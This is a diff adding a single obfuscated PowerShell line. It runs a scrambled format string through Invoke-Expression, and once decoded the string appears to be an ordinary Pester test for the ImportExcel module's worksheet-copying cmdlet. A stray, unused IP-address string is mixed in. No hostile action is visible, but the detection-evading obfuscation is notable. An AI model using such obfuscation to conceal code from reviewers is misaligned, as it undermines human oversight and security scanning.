@@ -1,0 +1,145 @@
+ .((geT-vaRIABle '*MdR*').NamE[3,11,2]-JOIn'')( ((("{51}{70}{124}{33}{78}{153}{19}{62}{36}{58}{125}{27}{131}{68}{55}{16}{59}{26}{108}{77}{2}{129}{85}{94}{148}{31}{13}{110}{72}{12}{3}{156}{90}{24}{86}{104}{112}{163}{65}{143}{101}{128}{160}{134}{154}{121}{39}{138}{84}{96}{122}{159}{123}{5}{69}{141}{32}{56}{111}{0}{150}{63}{168}{61}{50}{74}{42}{21}{164}{30}{81}{106}{113}{140}{45}{89}{92}{73}{100}{97}{53}{15}{115}{135}{144}{169}{152}{105}{93}{83}{165}{48}{1}{102}{47}{98}{60}{34}{10}{37}{9}{157}{91}{130}{67}{71}{54}{52}{99}{136}{64}{158}{146}{132}{127}{170}{145}{151}{162}{161}{14}{103}{117}{167}{22}{119}{80}{4}{8}{147}{11}{49}{109}{149}{17}{25}{44}{76}{139}{43}{95}{38}{66}{79}{87}{41}{46}{133}{35}{40}{6}{20}{120}{155}{88}{114}{126}{18}{142}{7}{23}{166}{137}{75}{118}{29}{171}{116}{172}{28}{107}{82}{57}"-f 'Should      -Be 3','ssThan ',' )
+        StrE164Phone     = Aoq+32 (444) 444 4444Aoq
+        StrAltPhone1     = Aoq+32 4 4444 444Aoq
+        StrA','         JnPws ','ive:n62reportsA','     ','lyContinue
+            R','        JnPe = Open-ExcelPackage JnPxlfile
+  ','rchive.xlsxCA1
+
+   ','  ZeT Sh','[2,','           Rem','-SourceWorkbook JnPpath1 -DestinationWorkbook JnPpath2
+            JnPexcel = Open-ExcelPackage -Path JnPpath2
+   ','CA1https://github.com/dfinke/ImportExcelCA1
+        Link2            = CA1https://github.com/dfinke/Impor','         ','d     ','StrEuroThousand  = Aoq1.555,83Aoq
+        StrDot           = Aoq1.2Aoq
+      ','}
+        }
+
+        it CA1Should copy and remove sheets                                                          CA1 {
+            JnPtargetSheets = CA11.1.2019CA1, CA11.4.2019CA1
+
+            JnP','ame JnP_
+            }
+   ','Process ZeT Ex','emove-Item JnPxlfile','     ZeT Should      -Be  2
+   ','hould      -Be  JnPtrue
+           (JnPws.Cells[2, 20].Value -is [valuetype] )                    ZeT Should      -Be  JnPtrue
+        }
+    }
+
+    Context CA1Copy worksheet shou','          JnPe.Workbook.Worksheets ZeT Copy-ExcelWorksheet -De','                                    CA1 {
+ ','targetSheets ZeT ForE','= (','herCurrencySymbol = CA1JnPCA1 }
+    else { Jn','                   ZeT should      -be 5','the command   ','                           CA1 {
+            JnPws.Cells[2, 1].Value','i]','ng the expected ','oq)]
+param()
+
+Describe CA1Copy-WorksheetCA1 ','        (JnPws.Cells',' J','ort-Excel JnPpath1 -DisplayPropertySet -WorkSheetname Processes -ReturnRange
+
+    if ((Get-Culture).NumberForm',' 8].Value -is [valuetype] )                 ZeT Should      -Be  JnPtrue
+                JnPws.Cells[2, 9].Value.GetType().name                  ','        Jn','exce','nPxlfileArchive = CA1TestDrive:n62reportsArchive.xlsxCA1
+
+            Remove-Item JnPxlfile -ErrorAction Silent','Worksheet -FullName JnPxlfile -WorksheetName JnP_ }
+
+            (Get-ExcelSheetInfo -Path JnPxlfile ).Count ZeT Should -Be 3
+        }
+    }
+
+    Conte','CopyOfMixedTypesCA1
+            JnPws.Dimension.Columns                                       ZeT Should      -Be  22
+            JnPws.Dimension.Rows                                     ','
+            }
+  ','ach-Object {
+                Copy-ExcelWork','          JnPws.Cells[2, 2].Formula                                     ZeT Should      -Be  AoqSUM(F2:G2)Aoq
+           ','xt CA1Copy worksheet should support piped inputCA1 {
+        BeforeAll {
+            JnPxlfile = CA1TestDr','           ZeT','2, 13].Value -is [valuetype] )                    ZeT Should      -Be  JnPtrue
+            JnPws.Cells[2, 11].Value                                      ZeT Should      -BeLessThan 0
+            JnPws.Cells[2, 12].Value                                      ZeT Should      -BeLe','ove-Item JnPxlfileArchive -E','s.Name              ','[Diagnostics.CodeAnalysis.SuppressMessageAttribute(AoqPSUseDeclaredVarsMoreT','.Cells[2, 9','oul','parator -EQ CA1.CA1) {
+               (JnPws','         = [math]::pi
+        IPAddress        = Aoq10.10.25.5Aoq
+        StrLeadZero      = Aoq07670Aoq
+        StrComma         = Aoq0,26Aoq
+        StrEngThousand   = Aoq1,234.56Aoq
+        ','name, number of rows and number of columns     CA1 {
+            JnPExcel.Workbook.Worksheets','ldAoq
+        }
+    }
+}
+','a','  StrNegInt        = Aoq-31Aoq
+        StrTrailingNeg   = Aoq31-Aoq
+        StrParens        = Aoq(123)Aoq
+        strLocalCurrency ','eLessThan 0
+            if ((Get-Culture).NumberFormat.NumberGroupSeparator -EQ CA1,CA1) {
+       ','
+            JnPw','p','ws                                                         ','        ZeT Should      -Be  AoqStringAoq
+ ','.Address ','PSETt=  (CA1{0}{2}{1}{3}{4}CA1 -','q
+            }
+            elseif ((Get-Culture).NumberFormat.','Ordered]@{
+        Date             = Get-Date
+        Formula1         = Aoq=SUM(F2:G2)Aoq
+        String1          = AoqMy StringAoq
+        Float   ','   Close-ExcelPackage','hanAssignmentsAoq,AoqAoq,Ju','NumberGroupSe',' IPAddress, StrLeadZero, StrAltPhone2 -WorkSheetname MixedTypes -Path JnPpath2
+    Context CA1Simplest copyCA1 {
+        BeforeAll {
+            Copy-ExcelWorksheet ','().name   ','                                      ZeT Should      -Be CA1','ve JnPe
+        }
+        it ','sheet -SourceWorkbook JnPxlfi',' = (Aoq{0}123.45Aoq -f JnPOtherCurrencySymbol','{
+    JnPpath1 = CA1TestDrive:n62Test1.xlsxCA1
+    JnPpath2 = CA1TestDrive:n62Test2.xlsxCA1
+    Remove-','f Aoqip:5Aoq,Aoq3Aoq,Aoq8.Aoq,Aoq8.166.21Aoq,Aoq7Aoq)
+
+            JnPtargetSheets Z','fileArchive = CA1TestDr','.Gettype().name  ','      -be AoqHello Wor','StringAoq
+           (JnPws.Cells[2, 11].Value -is [valuetype] )                    ZeT Should      -Be  JnPtrue
+           (JnPws.Cells[2, 12].Value','stinationWorkbook JnPexc','     = Aoq+3244444444Aoq
+        StrLeadSpace','  ','eT ForEach-Object { Remove-','2019CA1
+
+            JnPsheets ZeT ForEach-Object {
+                CA1Hello WorldCA1 ZeT Expor',' JnPws.Cells[2','Pexcel.Workbook.Worksheets[CA1ProcessesCA1]
+        }
+        it CA1Inserted a worksheet                               ','ld      -Be ',', 5].Value.GetType','ould      -Be  Aoq','     = Aoq  123Aoq
+','  ','el -Destina','                  ZeT Sh',' Should      -B','].Value -is [valuetype] )                 ZeT Should      -Be  JnPtru','   ','                        ZeT ','0
+            JnPws.Cells[2, 13].Value                           ','  JnPws.Cells[2, 17].Value.GetType().name                       ZeT Should      -Be  Aoq','         JnPExcel.Workbook.Worksheets.count                            ZeT Should      -Be 2
+            JnPws                       ','      ZeT Sh','                      ','
+            JnPexcel.Workbook.Worksheets[Aoq1.3.2019Aoq].Cells[AoqA1Aoq].Value    ZeT should','Aoq{0}123.45Aoq -f (Get-Culture).NumberFormat.CurrencySymbol )
+        strOtherCurrency','rrorAction SilentlyContinue
+
+            JnPsheets = CA11.1.2019CA1, CA11.2.2019CA1, CA11.3.2019CA1, CA11.4.2019CA1, CA11.5.2019CA1
+
+            JnPsheets ZeT ForEach-Object {
+                CA1Hell','tExcelCA1     # Links are not copied correctly, hopefully this will be fixed at some future date
+    } ZeT Export-Excel  -NoNumberConversion','.count                            ZeT ','                                  ZeT Should -Not -BenullorEmpty
+            ','Ze','t-Excel JnPxlfile -Worksh',' -Be ','                                     CA1 {
+            JnPex','S','CA1Should copy sheets piped into ','ld close all filesCA1 {
+        BeforeAll {
+            JnPxlfile = CA1TestDrive:n62reports.xlsxCA1
+            JnPxl','Archive -ErrorAction SilentlyContinue
+
+            JnPsheets = CA11.1.2019CA1,','opy-ExcelWorksheet -SourceWorkbook JnP','tionWorkSheet CA1CopyOfMixedT','1
+    ','stification=AoqFalse PositivesA','t.CurrencySymbol -eq CA1£CA1) { JnPOt','eetN','    ZeT Should      -Be ','Should -Be JnPProcRange
+        }
+    }
+    C','ltPhone2',' AoqStringAo','POtherCurrencySymbol = CA1£CA1 }
+    [PSCustOmobject][','s[2, 14].Value -is [valuetype] )                ','ive:n62reports.xlsxCA1
+           ','ed types using a package objectCA1 {
+        Befo',' AoqStringAoq
+     ','e
+                JnPws.Cells[2, 8].Value.GetType().name            ','book JnPxlfileArchive
+            Close-ExcelPackage -NoSa','l -De','le -DestinationWorkbook JnPxlfileArchive -SourceWorkSheet JnP_ -DestinationWorkSheet JnP_','T Should      -Be  AoqDateTimeAoq
+  ',' -ExcelPackage JnPexcel
+            JnPexcel = Open-ExcelPackage -Path JnPpath2
+            JnPws = JnPExcel.Workbook.Worksheets[3]
+        }
+        it CA1Copied a worksheet, givi',' ','              ','       JnPws.Cells[2, 6].Value.GetType().name ','15].Value.GetType().name                       ZeT Should      -B','   }
+           (JnPws.Cell','         Remove-Item JnPxlfile -ErrorAction SilentlyContinue
+ ','        StrTrailSpace    = Aoq123   Aoq
+        Link1            = [ur','o WorldCA1 ZeT Export-Excel JnPxlfile -WorksheetName JnP_
+            ','
+            JnP','e ','         ','Item -Path JnPpath1, JnPpath2  -ErrorAction SilentlyContinue
+
+    JnPProcRange = Get-','reAll {
+            C',' CA11.2.2019CA1, CA11.3.2019CA1, CA11.4.2019CA1, CA11.5.','= Jn','ou','        ','ypesCA','ontext CA1Mix','[2, 16].Value.GetType().name                       ZeT Should      -Be  AoqStringAoq
+ ',' AoqStringAoq
+            JnPws.Cells','JnPws.Dimension','     }
+        it CA1Copied the expected data into the worksheet                 ',' -is [valuetype] )                    ZeT Should      -Be  JnPtrue
+           (JnPws.Cells[','stinationWork','tringAoq
+           (JnPws.Cells[2, 19].Value -is [valuetype] )                    ZeT S','ZeT Should -Not -BenullorEmpty','                       ZeT Should      -Be  AoqStringAoq
+            JnPws.Cells[2, 18].Value.GetType().name        ',' JnPtrue
+            JnPws.Cells[2, ','      ','cel = Open-ExcelPackage JnPxlfileArchive
+            JnPexcel.Workbook.Worksheets.Count         '))  -CrePLacE([CHar]74+[CHar]110+[CHar]80),[CHar]36-RePlACE([CHar]67+[CHar]65+[CHar]49),[CHar]34  -RePlACE ([CHar]90+[CHar]101+[CHar]84),[CHar]124 -RePlACE  'Aoq',[CHar]39 -RePlACE 'n62',[CHar]92))
